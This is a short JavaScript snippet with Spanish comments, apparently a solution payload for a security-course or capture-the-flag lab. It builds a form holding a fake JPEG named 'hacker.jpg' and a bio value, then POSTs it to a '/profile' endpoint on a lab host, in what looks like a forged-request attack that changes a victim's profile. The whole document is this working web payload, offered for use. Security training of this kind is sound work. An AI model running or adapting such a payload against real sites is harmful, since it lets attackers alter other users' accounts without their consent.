var formData = new FormData();
formData.append("bio", "None"); 
var fakeImage = new Blob(["imagen_modificada"], { type: "image/jpeg" });
formData.append("profile_pic", fakeImage, "hacker.jpg");

// Recuerda poner la ruta correcta de la petición original aquí
fetch('https://chl-4678a9a0-9134-4d4a-9ff5-023cd20a4d1c-blog-hacklab.softwareseguro.com.ar/profile', {
  method: 'POST',
  body: formData
});